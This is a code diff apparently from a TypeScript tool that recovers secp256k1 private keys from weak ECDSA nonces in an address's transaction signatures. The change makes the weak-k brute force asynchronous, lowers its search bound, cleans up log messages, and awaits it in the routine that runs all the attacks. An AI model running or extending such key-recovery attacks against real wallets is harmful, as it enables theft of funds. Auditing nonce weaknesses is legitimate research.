@@ -449,7 +449,7 @@ export function relatedNonceAttack(
 // 5. WEAK k BRUTE FORCE
 // ═══════════════════════════════════════════════════════════════════════════════
 
-const MAX_WEAK_K = 500_000n; // checks k=1..500,000
+const MAX_WEAK_K = 65_535n;  // checks k=1..65535 (0xFFFF); large enough to catch all meaningful weak-k values without blocking the event loop
 
 // Known bad nonce values from historical exploits
 const KNOWN_BAD_K_VALUES: bigint[] = [
@@ -477,11 +477,13 @@ const KNOWN_BAD_K_VALUES: bigint[] = [
  *   3. Also test all KNOWN_BAD_K_VALUES
  *   4. For every hit: recover d and verify address
  */
-export function weakKBruteForce(
+const WEAK_K_YIELD_EVERY = 200n; // yield to event-loop every 200 secp256k1 mults
+
+export async function weakKBruteForce(
   address: string,
   sigs:    TxSignatureData[],
   maxK:    bigint = MAX_WEAK_K,
-): AdvancedFinding[] {
+): Promise<AdvancedFinding[]> {
   const findings: AdvancedFinding[] = [];
   if (sigs.length === 0) return findings;
 
@@ -504,7 +506,7 @@ export function weakKBruteForce(
     if (!res) return;
 
     logger.warn({ address, k: k.toString(), privKey: res.privKey.slice(0, 12) + "…", verified: res.verified },
-      res.verified ? "🔑 WEAK-k KEY RECOVERED (verified)" : "⚡ WEAK-k candidate (unverified)");
+      res.verified ? "WEAK-k KEY RECOVERED (verified)" : "WEAK-k candidate (unverified)");
 
     findings.push({
       type:      "weak_k_recovered",
@@ -519,11 +521,14 @@ export function weakKBruteForce(
     });
   };
 
-  // Test known-bad values first (fast)
+  // Test known-bad values first (fast, synchronous)
   for (const k of KNOWN_BAD_K_VALUES) tryK(k);
 
-  // Sequential brute force
+  // Sequential brute force — yield every WEAK_K_YIELD_EVERY iters to stay responsive
   for (let k = 1n; k <= maxK; k++) {
+    if (k % WEAK_K_YIELD_EVERY === 0n) {
+      await new Promise<void>(r => setImmediate(r));
+    }
     tryK(k);
     if (findings.length >= 5) break; // enough
   }
@@ -964,9 +969,9 @@ export async function runAllAdvancedAttacks(
     allFindings.push(...latticeAttack(address, sigs, biasReport));
   }
 
-  // 5. Weak k brute force (run for small-r addresses or always)
+  // 5. Weak k brute force (run for small-r addresses or always) — now async/yielding
   if (biasReport.smallRCount > 0 || sigs.length <= 1000) {
-    allFindings.push(...weakKBruteForce(address, sigs));
+    allFindings.push(...await weakKBruteForce(address, sigs));
   }
 
   // Cross-address (if global map provided)
